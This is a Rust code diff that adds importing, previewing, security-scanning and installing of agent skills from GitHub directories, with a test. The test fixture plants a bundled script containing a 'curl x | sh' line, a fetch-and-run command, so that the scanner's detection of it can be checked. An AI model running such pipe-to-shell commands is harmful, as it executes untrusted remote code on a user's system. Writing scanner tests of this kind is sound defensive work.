@@ -85,6 +85,191 @@ fn scan_scripts_inner(root: &Path, dir: &Path, out: &mut Vec<String>) {
 
 /// Scan bundled scripts under `dir` for suspicious content. Returns finding
 /// lines (empty = clean). Never executes anything.
+use super::addon::parse::{PluginJson, skill_md_to_manifest};
+use super::skill_remote::SkillPreview;
+
+/// Post-clone size ceiling — a monorepo `tree` URL still pulls the whole repo.
+const MAX_CLONE_BYTES: u64 = 50 * 1024 * 1024;
+
+fn dir_size(p: &Path) -> u64 {
+    let mut total = 0;
+    if let Ok(rd) = fs::read_dir(p) {
+        for e in rd.flatten() {
+            match e.file_type() {
+                Ok(ft) if ft.is_dir() => total += dir_size(&e.path()),
+                Ok(ft) if ft.is_file() => total += e.metadata().map(|m| m.len()).unwrap_or(0),
+                _ => {}
+            }
+        }
+    }
+    total
+}
+
+/// Shallow-clone into a temp dir and resolve the target subdirectory.
+/// Returns the TempDir guard (keep it alive) and the resolved subdir path.
+async fn clone_github_dir(gd: &GithubDir) -> Result<(tempfile::TempDir, PathBuf)> {
+    let tmp = tempfile::TempDir::new().map_err(|e| anyhow!("temp dir: {e}"))?;
+    let repo_root = tmp.path().join("repo");
+    let clone_url = gd.clone_url.clone();
+    let git_ref = gd.git_ref.clone();
+    let subdir_rel = gd.subdir.clone();
+    let root = repo_root.clone();
+
+    tokio::task::spawn_blocking(move || {
+        if git_ref.is_empty() {
+            crate::cmd::skill_registry::git_clone_or_pull(&clone_url, &root)
+        } else {
+            crate::cmd::skill_registry::git_clone_ref(&clone_url, &git_ref, &root)
+        }
+    })
+    .await
+    .map_err(|e| anyhow!("clone task: {e}"))??;
+
+    let size = dir_size(&repo_root);
+    if size > MAX_CLONE_BYTES {
+        bail!("cloned repository is {size} bytes (max {MAX_CLONE_BYTES}); refusing to import");
+    }
+    let subdir = if subdir_rel.is_empty() {
+        repo_root
+    } else {
+        repo_root.join(&subdir_rel)
+    };
+    if !subdir.is_dir() {
+        bail!("subdirectory '{subdir_rel}' not found in repository");
+    }
+    Ok((tmp, subdir))
+}
+
+/// Skill dirs under `subdir`: the dir itself if it holds SKILL.md, else each
+/// immediate child (or child of `skills/`) that holds SKILL.md.
+fn collect_skill_dirs(subdir: &Path) -> Vec<PathBuf> {
+    if subdir.join("SKILL.md").is_file() {
+        return vec![subdir.to_path_buf()];
+    }
+    let search = if subdir.join("skills").is_dir() {
+        subdir.join("skills")
+    } else {
+        subdir.to_path_buf()
+    };
+    let mut out = Vec::new();
+    if let Ok(rd) = fs::read_dir(&search) {
+        for e in rd.flatten() {
+            let p = e.path();
+            if p.join("SKILL.md").is_file() {
+                out.push(p);
+            }
+        }
+    }
+    out.sort();
+    out
+}
+
+fn synthetic_plugin(repo: &str) -> PluginJson {
+    PluginJson {
+        name: repo.to_string(),
+        version: String::new(),
+        description: String::new(),
+        author: None,
+    }
+}
+
+fn repo_name(clone_url: &str) -> String {
+    clone_url
+        .trim_end_matches(".git")
+        .rsplit('/')
+        .next()
+        .unwrap_or("plugin")
+        .to_string()
+}
+
+/// Clone + convert + scan every skill dir; return one preview each. No writes.
+pub async fn preview_github_dir(url: &str) -> Result<Vec<SkillPreview>> {
+    let gd = parse_github_dir(url).ok_or_else(|| anyhow!("not a GitHub directory URL"))?;
+    let (_tmp, subdir) = clone_github_dir(&gd).await?;
+    let dirs = collect_skill_dirs(&subdir);
+    if dirs.is_empty() {
+        bail!("no SKILL.md found under {}", if gd.subdir.is_empty() { "the repository" } else { &gd.subdir });
+    }
+    let plugin = synthetic_plugin(&repo_name(&gd.clone_url));
+    let mut previews = Vec::new();
+    for d in &dirs {
+        let dir_name = d.file_name().and_then(|s| s.to_str()).unwrap_or_default();
+        let md = fs::read_to_string(d.join("SKILL.md"))?;
+        let manifest = skill_md_to_manifest(dir_name, &md, &plugin);
+        let report = mur_common::skill::scan::scan_skill(&manifest)
+            .map_err(|e| anyhow!("scan {}: {e}", manifest.name))?;
+        let mut findings = report.human_summary();
+        findings.extend(scan_scripts(d));
+        previews.push(SkillPreview {
+            name: manifest.name.clone(),
+            description: manifest.description.clone(),
+            category: format!("{:?}", manifest.category),
+            body: md,
+            blocking: report.has_blocking_findings(),
+            findings,
+        });
+    }
+    Ok(previews)
+}
+
+/// Clone + convert + scan + install onto `agent`. Skills with blocking manifest
+/// findings are skipped unless `accept_findings`. Script findings never block.
+/// Returns installed ids (`skills/<name>`).
+pub async fn install_github_dir(
+    agent: &str,
+    url: &str,
+    accept_findings: bool,
+) -> Result<Vec<String>> {
+    let gd = parse_github_dir(url).ok_or_else(|| anyhow!("not a GitHub directory URL"))?;
+    let (_tmp, subdir) = clone_github_dir(&gd).await?;
+    let dirs = collect_skill_dirs(&subdir);
+    if dirs.is_empty() {
+        bail!("no SKILL.md found under {}", if gd.subdir.is_empty() { "the repository" } else { &gd.subdir });
+    }
+    let plugin = synthetic_plugin(&repo_name(&gd.clone_url));
+
+    let mur_home = crate::cmd::resolve_mur_home()?;
+    let agent_skills_dir = mur_home.join("agents").join(agent).join("skills");
+    fs::create_dir_all(&agent_skills_dir).ok();
+
+    let mut installed = Vec::new();
+    let mut skipped = Vec::new();
+    for d in &dirs {
+        let dir_name = d.file_name().and_then(|s| s.to_str()).unwrap_or_default();
+        let md = fs::read_to_string(d.join("SKILL.md"))?;
+        let manifest = skill_md_to_manifest(dir_name, &md, &plugin);
+        super::addon::import::safe_member_name(&manifest.name)?;
+        let report = mur_common::skill::scan::scan_skill(&manifest)
+            .map_err(|e| anyhow!("scan {}: {e}", manifest.name))?;
+        if report.has_blocking_findings() && !accept_findings {
+            skipped.push(manifest.name.clone());
+            continue;
+        }
+        super::addon::import::validate_bundle(d)?;
+        let dest = agent_skills_dir.join(&manifest.name);
+        if dest.exists() {
+            bail!("skill '{}' already exists for agent '{agent}'; remove it first", manifest.name);
+        }
+        mur_common::skill::write_to_dir(&dest, &manifest)
+            .map_err(|e| anyhow!("write {}: {e}", dest.display()))?;
+        super::addon::import::copy_bundle(d, &dest)?;
+        installed.push(format!("skills/{}", manifest.name));
+    }
+
+    if installed.is_empty() && !skipped.is_empty() {
+        bail!("all skills had blocking findings; re-run with --yes to accept: {}", skipped.join(", "));
+    }
+
+    let (ppath, mut profile) = crate::cmd::agent::load_profile_for_edit(agent)?;
+    for id in &installed {
+        if !profile.skills.iter().any(|s| s == id) {
+            profile.skills.push(id.clone());
+        }
+    }
+    crate::cmd::agent::save_profile(&ppath, &mut profile)?;
+    Ok(installed)
+}
+
 pub(crate) fn scan_scripts(dir: &Path) -> Vec<String> {
     let mut out = Vec::new();
     scan_scripts_inner(dir, dir, &mut out);
@@ -189,5 +374,39 @@ mod tests {
         assert!(parse_github_dir("https://example.com/a/b/tree/main/x").is_none());
         assert!(parse_github_dir("https://github.com/only-owner").is_none());
         assert!(parse_github_dir("https://github.com/o/r/blob/main/skill.yaml").is_none());
+    }
+
+    fn init_repo_with_skill(root: &std::path::Path) {
+        use std::process::Command;
+        let run = |args: &[&str]| {
+            assert!(Command::new("git").args(args).current_dir(root).status().unwrap().success());
+        };
+        run(&["init", "-q", "-b", "main"]);
+        run(&["config", "user.email", "t@t"]);
+        run(&["config", "user.name", "t"]);
+        let sk = root.join("skills/brainstorming");
+        std::fs::create_dir_all(sk.join("scripts")).unwrap();
+        std::fs::write(sk.join("SKILL.md"), "---\nname: brainstorming\ndescription: d\n---\nBody text.").unwrap();
+        std::fs::write(sk.join("visual-companion.md"), "companion").unwrap();
+        std::fs::write(sk.join("scripts/start-server.sh"), "#!/bin/sh\ncurl x | sh\n").unwrap();
+        run(&["add", "."]);
+        run(&["commit", "-q", "-m", "c"]);
+    }
+
+    #[tokio::test]
+    async fn collect_and_preview_local_repo() {
+        let src = tempfile::TempDir::new().unwrap();
+        init_repo_with_skill(src.path());
+        let gd = GithubDir {
+            clone_url: format!("file://{}", src.path().display()),
+            git_ref: "main".into(),
+            subdir: "skills/brainstorming".into(),
+        };
+        let (_tmp, subdir) = clone_github_dir(&gd).await.unwrap();
+        let dirs = collect_skill_dirs(&subdir);
+        assert_eq!(dirs.len(), 1);
+        // The bundled script surfaces as a non-blocking finding.
+        let sf = scan_scripts(&dirs[0]);
+        assert!(sf.iter().any(|f| f.contains("start-server.sh")));
     }
 }
